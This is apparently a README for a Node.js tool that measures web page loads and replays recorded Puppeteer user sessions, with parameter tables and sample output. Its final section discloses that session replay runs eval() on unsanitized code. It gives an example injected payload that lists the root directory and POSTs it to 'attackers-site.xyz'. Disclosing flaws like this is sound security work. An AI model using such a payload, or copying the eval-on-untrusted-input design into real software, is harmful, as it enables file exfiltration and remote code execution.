# HTTP Dynamic Analysis with support of replaying user session 



## 1. Install Dependencies
Ensure you have Node.js and npm installed. You can download Node.js [here](https://nodejs.org/).

Then run the following command in "/core" directory
```bash
npm install
```


## Overview

This script provides a command-line interface (CLI) for making HTTP Dynamic Analysis:
1. Single page analysis
2. User session recording.


## Input (Single page analysis)

| Parameter                | Type       | Default | Required | Description                                                                                     |
|--------------------------|------------|---------|----------|-------------------------------------------------------------------------------------------------|
| `target_host`                 | `str`      | N/A     | Yes      | The URL address for the HTTP request. This parameter is mandatory.                              |
| `screenshot_timing_type` | `str`      | "load"  | No       | Screenshot will be taken after an even("load", "networkidle0", "networkidle2")*                 |
| `screenshot_timing`      | `int, float` | 0       | No       | Additional waiting time in milliseconds that will be awaited after screenshot_timing_type event |
| `timeout`                | `int` | 30000   | No       | Maximum runtime of the monitor in milliseconds.                                                        |
* "load" Waits for the 'load' event.
* "networkidle0" Waits till there are no more than 0 network connections for at least 500 ms.
* "networkidle2" Waits till there are no more than 2 network connections for at least 500 ms.


## Input (User session recording)

| Parameter                         | Type           | Default | Required | Description                                                                                                                                |
|-----------------------------------|----------------|---------|----------|--------------------------------------------------------------------------------------------------------------------------------------------|
| `replay_script`                   | `str` (Base64) | N/A     | Yes      | Downloaded user session script in `Base64` from chrome (when exporting from chrome select option 'Puppeteer') This parameter is mandatory. |
| `timing_between_steps` | `int, float` | 200     | No       | Waiting time in milliseconds between individual steps.                                                             |
| `timeout`                         | `int`          | 30000   | No       | Total timeout for executing user session recording in milliseconds,  pass `0` to disable timeout                                           |
| `element_search_timeout`          | `int`          | 5000    | No       | Timeout for finding an element pass `0` to disable timeout                                                                                 |
* "element_search_timeout" when element_search_timeout is exceeded it indicates that page has changed. See also: [How 'Page changed' works.](docs/PAGE_CHANGED.md) 
* "replay_script" See also: [How 'Script generation' works.](docs/SCRIPT_GENERATION.md) 



## Output 

| Parameter        | Type         | Description                                                         |                                                                             
|------------------|--------------|---------------------------------------------------------------------|
| `run_id`            | `int`        |                                                                     |
| `status`            | `string`     | 'completed' , 'error'  ,'page_changed', 'partial' |
| `error_msg`            | `string`     | error message when status is 'completed' error_msg is not present   |
| `visited_pages`            | `list<dict>` | List of visited pages                                               |
* "partial" status means that analysis is incomplete due to error, typically timeout error. All the data that was processed up to the point 
of error are present in output.
* "page_changed" status means that analysis is incomplete due to element_search_timeout error. It indicates that page has been changed. See also: [How 'Page changed' works.](docs/PAGE_CHANGED.md) 
All the data that was processed up to the point of error are present in output with an additional screenshot of the page where the element was not found.
### visited_pages Item


| Parameter                 | Type         | Description                                       |                                                                             
|---------------------------|--------------|---------------------------------------------------|
| `current_url`             | `string` | Current visiting url                              |
| `status`            | `string`     | 'completed' ,'partial' ,'page_changed'                                    |
| `load_time`               | `int`        | Time of 'load' event in milliseconds              |
| `dom_content_loaded_time` | `int`        | Time of 'DOMContentLoaded ' event in milliseconds |
| `total_data_size`         | `int`        | Total size of dependencies in bytes               |
| `waterfall_analysis`      | `list<dict>` | List of network requests                          |
| `image`                   | `string`     | Image in Base64                                   |
* "partial" status means that `this` visited page is not complete, the remaining data are missing
due to error.
* "page_changed" status means that `this` visited page does not contain element that recording was searching for.


### waterfall_analysis Item

| **Parameter**            | **Type** | **Description**                                                                                 |
|--------------------------|--------|-------------------------------------------------------------------------------------------------|
| `url`                     | `str`  | URL of the requested resource.                                                                  |
| `method`                  | `str`  | HTTP method used for the request.                                                               |
| `status_code`              | `int`  | HTTP response status code                                                                       |
| `size`             | `int`  | Size of the resource, in bytes.                                                                 |
| `start_transfer_time`      | `str`  | Unix Timestamp when the transfer of the resource began.                                         |
| `time`              | `int`  | Total time taken for the request, in milliseconds.                                              |
| `error_msg`            | `str`  | Any error messages related to the request. If no error was raised then error_msg is not present |

  
## Example (User session recording)

## Input
```json
{
      "replay_script": "Y29uc3QgcHVwcGV0ZWVyID0gcmVxdWly7IC8v..........",
      "timeout": 10000
}
```

## Output

```json
   {
    "output": {
        "run_id": 1,
        "status": "completed",
        "visited_pages": [
            {
                "current_url": "https://csu.gov.cz/",
                "status": "completed",
                "load_time": 471,
                "dom_content_loaded_time": 264,
                "total_data_size": 1616292,
                "waterfall_analysis": [
                    {
                        "url": "https://csu.gov.cz/",
                        "method": "GET",
                        "status_code": 200,
                        "size": 92033,
                        "start_transfer_time": "1732910475485",
                        "time": "15"
                    },
              ...],
               "image": "iVBORw0KGgoAAAANSUhEUgAABl0AAA2zCAIAAADtPyzlAAAgAElEQVR4nOzdd1gU19o....."
            },
                {
                "current_url": "https://csu.gov.cz/kultura-media-sport",
                "status": "completed",
                "load_time": 120,
                "dom_content_loaded_time": 85,
                "total_data_size": 1135791,
                "waterfall_analysis": [
                    {
                        "url": "https://csu.gov.cz/resources/statistika/widgets/assets/ErrorPage-453a4450.js",
                        "method": "GET",
                        "status_code": 200,
                        "size": 6006,
                        "start_transfer_time": "1729858195687",
                        "time": "8"
                    },
                    ...],
                  "image": "iVBORw0KGgoAAAANSUhEUgAABl0AAA2zCAIAAADtPyzlAAAgAElEQVR4nOzdd1gU19o....."
                }...
        ]
}
```



## Example (Single page analysis)

## Input
```json
   {
    "target_host": "https://www.vut.cz/",
    "screenshot_timing_type": "load",
    "screenshot_timing": 0,
    "timeout": 10000
}
```

## Output

```json
{
    "output": {
        "run_id": 1,
        "status": "completed",
        "visited_pages": [
            {
                "current_url": "https://www.vut.cz/",
                "status": "completed",
                "load_time": 1262,
                "dom_content_loaded_time": 542,
                "total_data_size": 19217114,
                "waterfall_analysis": [
                    {
                        "url": "https://www.vut.cz/",
                        "method": "GET",
                        "status_code": 200,
                        "size": 80817,
                        "start_transfer_time": "1732910735436",
                        "time": "20"
                    },
                    {
                        "url": "https://www.vut.cz/i/css/portal2018.css?ver=30",
                        "method": "GET",
                        "status_code": 200,
                        "size": 257505,
                        "start_transfer_time": "1732910735458",
                        "time": "12"
                    },
            ...
          ],
          "image": "iVBORw0KGgoAAAANSUhEUgAAAyAAABQbCAIAAACY1sQRAAAA....."
        }
      ]
    }
```

# Notes
### Combining inputs 
-  When input json contains both Inputs (User session recording) and (Single page analysis) it will run only (User session recording)
### Visited Pages
- For every user interaction in recorded session is new record in Visited pages. For example when user clicks on dropdown menu there will be record in visited_pages, although technically it is not new visited page. That means that additional screenshot of page with expanded dropdown will be taken with additional waterfall_analysis items but "load_time" and "dom_content_loaded_time" are not changed.
### Cookies limitations
Differences in cookies between the recording environment of client's browser and  playback environment can cause the website to behave differently.
### Possible security vulnerabilities
- (User session recording) is executing eval() function of generated code that contains parts of unsanitized code from user recorded session.
### Example of possible attack vector (When user uploads recorded seesion as provided example)
Sending content of a '/' directory 
```javascript
{{
const url = 'https://attackers-site.xyz'
const data = {
  data: require('fs').readdirSync('/'),
};
fetch(url, {
  method: 'POST', 
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify(data),
})
  .then(response => response.json())
  .then(responseData => {
    console.log('Response:', responseData);
  })
  .catch(error => {
    console.error('Error:', error);
  });
process.exit(1)
}}
```
